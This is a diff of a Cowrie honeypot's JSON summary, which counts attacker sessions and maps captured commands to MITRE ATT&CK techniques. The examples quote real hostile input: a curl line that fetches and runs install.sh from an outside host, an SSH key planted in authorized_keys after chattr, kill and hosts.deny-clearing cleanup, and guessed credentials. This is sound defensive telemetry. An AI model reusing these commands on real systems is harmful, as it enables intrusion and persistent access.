@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-20 03:03:11",
+  "generated": "2026-09-20 04:02:38",
   "totals": {
-    "commands": 87,
-    "login_failed": 101,
-    "login_success": 20,
-    "sessions": 142
+    "commands": 103,
+    "login_failed": 245,
+    "login_success": 23,
+    "sessions": 302
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 101,
+      "count": 245,
       "examples": [
         "zhy / zhy",
         "vivek / 123123",
@@ -21,14 +21,14 @@
         "admin / 28081979"
       ],
       "first": "2026-09-20T00:00:25.589298Z",
-      "last": "2026-09-20T03:02:57.959108Z",
-      "unique_ips": 15
+      "last": "2026-09-20T03:58:27.362806Z",
+      "unique_ips": 17
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 20,
+      "count": 23,
       "examples": [
         "root / LeitboGi0ro",
         "lghkel\\x09 / zpz}ld\\x09",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-09-20T01:13:40.450590Z",
-      "last": "2026-09-20T02:55:35.259685Z",
-      "unique_ips": 5
+      "last": "2026-09-20T04:00:48.400371Z",
+      "unique_ips": 6
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 13,
+      "count": 20,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -53,8 +53,8 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:13:44.786465Z",
-      "last": "2026-09-20T02:55:56.365799Z",
-      "unique_ips": 3
+      "last": "2026-09-20T04:01:05.338279Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
@@ -76,7 +76,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 7,
+      "count": 9,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -85,14 +85,14 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:13:43.828905Z",
-      "last": "2026-09-20T02:55:39.380883Z",
-      "unique_ips": 3
+      "last": "2026-09-20T04:00:52.847437Z",
+      "unique_ips": 4
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 8,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "ls -lh $(which ls)",
@@ -100,34 +100,34 @@
         "ls -l /var/tmp/.testfile 2>&1"
       ],
       "first": "2026-09-20T01:13:47.893205Z",
-      "last": "2026-09-20T02:55:38.282443Z",
-      "unique_ips": 3
+      "last": "2026-09-20T04:00:51.501959Z",
+      "unique_ips": 4
     },
     {
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 5,
+      "count": 6,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:13:47.893205Z",
-      "last": "2026-09-20T02:55:39.380883Z",
+      "last": "2026-09-20T03:41:14.155337Z",
       "unique_ips": 3
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 4,
+      "count": 5,
       "examples": [
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:33:32.387680Z",
-      "last": "2026-09-20T02:55:39.380883Z",
+      "last": "2026-09-20T03:41:14.155337Z",
       "unique_ips": 2
     },
     {
@@ -208,36 +208,36 @@
       10
     ],
     [
+      "echo WRITABLE >/tmp/.testfile 2>&1",
+      5
+    ],
+    [
       "echo SHELL_TEST",
-      3
+      4
     ],
     [
       "/bin/busybox TEST",
-      3
+      4
     ],
     [
       "cat /proc",
-      3
+      4
     ],
     [
       "./",
-      3
-    ],
-    [
-      "echo WRITABLE >/tmp/.testfile 2>&1",
-      3
+      4
     ],
     [
       "echo WGET_CHECK",
-      3
+      4
     ],
     [
       "rm -f /tmp/.testfile",
-      2
+      4
     ],
     [
       "cd /tmp",
-      2
+      4
     ],
     [
       "command -v python3 >/dev/null 2>&1 || (command -v apt-get >/dev/null 2>&1 && timeout 30 apt-get update -y; apt-get insta",
